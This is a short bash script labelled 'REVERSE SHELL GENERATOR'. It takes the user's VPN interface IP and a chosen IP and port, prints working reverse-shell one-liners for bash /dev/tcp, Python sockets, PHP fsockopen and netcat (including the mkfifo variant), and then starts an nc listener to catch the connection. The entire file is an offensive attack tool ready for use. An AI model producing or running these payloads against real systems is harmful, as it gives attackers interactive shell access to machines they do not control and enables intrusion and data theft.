#!/bin/bash
red=`tput setaf 1`
green=$'\e[1;32m'
yellow=`tput setaf 3`
reset=`tput sgr0`
mag=$'\e[1;35m'
echo "${mag} REVERSE SHELL GENERATOR ${reset}"
mine_=`ifconfig|grep -a2 tun0|grep -w "inet"|awk '{print $2}'`
echo "Your Machine IP is :" $green $mine_ $reset
echo "Enter Ip and port"
read ip_  port_
echo "The Ip is" $ip_
echo "The port is" $port_

echo "${red}==========================BASH==========================${reset}" 
echo -e "bash -i >& /dev/tcp/"$ip_"/"$port_ "0>&1 \n"
echo "${red}==========================PYTHON==========================${reset}"
echo -e "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$ip_\",$port_));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' \n"
echo "${red}==========================PHP==========================${reset}"
echo -e "php -r '$sock=fsockopen(\"$ip_\",$port_);exec(\"/bin/sh -i <&3 >&3 2>&3\");' \n"
echo "${red}==========================NETCAT==========================${reset}"
echo -e "nc -e /bin/sh $ip_ $port_ \nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip_ $port_ >/tmp/f \n \n"

nc -lvnp $port_